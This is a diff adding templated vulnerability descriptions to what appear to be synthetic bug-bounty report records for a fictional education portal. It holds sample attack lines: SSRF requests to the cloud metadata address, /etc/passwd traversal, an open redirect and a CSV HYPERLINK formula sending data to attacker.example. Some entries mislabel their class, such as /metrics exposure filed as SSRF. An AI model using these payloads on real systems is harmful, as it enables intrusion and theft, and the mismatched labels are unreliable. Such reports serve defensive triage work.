+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4136,7 +4168,8 @@
           "offset": "6d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4259,7 +4292,8 @@
           "offset": "4d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.waldlicht-bildung.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4373,7 +4407,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4521,7 +4556,8 @@
           "offset": "3d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4681,7 +4717,8 @@
           "offset": "6d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4797,7 +4834,8 @@
           "offset": "6d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.waldlicht-bildung.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4951,7 +4989,8 @@
           "offset": "4d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5062,7 +5101,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5213,7 +5253,8 @@
           "offset": "4d 21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5336,7 +5377,8 @@
           "offset": "10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5464,7 +5506,8 @@
           "offset": "2d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5580,7 +5623,8 @@
           "offset": "3d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5708,7 +5752,8 @@
           "offset": "7d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5831,7 +5876,8 @@
           "offset": "2d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5978,7 +6024,8 @@
           "offset": "3d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6110,7 +6157,8 @@
           "offset": "18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6242,7 +6290,8 @@
           "offset": "4d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6341,7 +6390,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6480,7 +6530,8 @@
           "offset": "3d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6620,7 +6671,8 @@
           "offset": "3d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.waldlicht-bildung.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6752,7 +6804,8 @@
           "offset": "1d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6898,7 +6951,8 @@
           "offset": "3d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7054,7 +7108,8 @@
           "offset": "6d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7177,7 +7232,8 @@
           "offset": "7d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7349,7 +7405,8 @@
           "offset": "8d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7451,7 +7508,8 @@
           "offset": "3d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7583,7 +7641,8 @@
           "offset": "1d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7707,7 +7766,8 @@
           "offset": "2d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7835,7 +7895,8 @@
           "offset": "2d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7943,7 +8004,8 @@
           "offset": "2d 11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8061,7 +8123,8 @@
           "offset": "6d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8192,7 +8255,8 @@
           "offset": "6d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
